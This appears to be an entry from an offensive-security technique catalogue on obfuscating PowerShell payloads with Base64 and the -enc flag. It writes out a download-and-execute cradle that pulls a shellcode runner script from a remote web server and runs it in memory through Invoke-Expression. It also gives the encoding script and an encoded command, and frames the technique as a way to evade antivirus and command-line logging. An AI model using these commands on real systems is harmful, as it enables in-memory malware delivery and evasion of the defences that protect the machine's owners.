---
description: |
  PowerShell supports executing Base64-encoded commands via the -EncodedCommand (-enc) flag. This is often used to obfuscate malicious commands, evade detection, and bypass command-line logging. An attacker encodes a PowerShell payload that downloads a remote script (run444.txt, a powershell shellcode runner) from a webserver and executes it in memory via Invoke-Expression (IEX). The encoded payload is then run using the powershell -enc syntax.

  Command Reference:
  ```
  Command to be executed: New-Object System.Net.WebClient).DownloadString('http://10.10.14.21/run444.txt') | IEX
  ```
command: |
  powershell -enc KABOAGUAdwAtAE8AYgBqAGUA...

code: |
  $text = "(New-Object System.Net.WebClient).DownloadString('http://10.10.14.21/run444.txt') | IEX"
  $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
  $EncodedText = [Convert]::ToBase64String($bytes)
  $EncodedText

items:
  - Shell
services:
  - AV
  - Explotation
OS:
  - Windows
attack_types:
  - Exploitation
references:
  - https://manage-the.cloud/2023/12/20/how-to-use-an-encoded-command-in-powershell/
---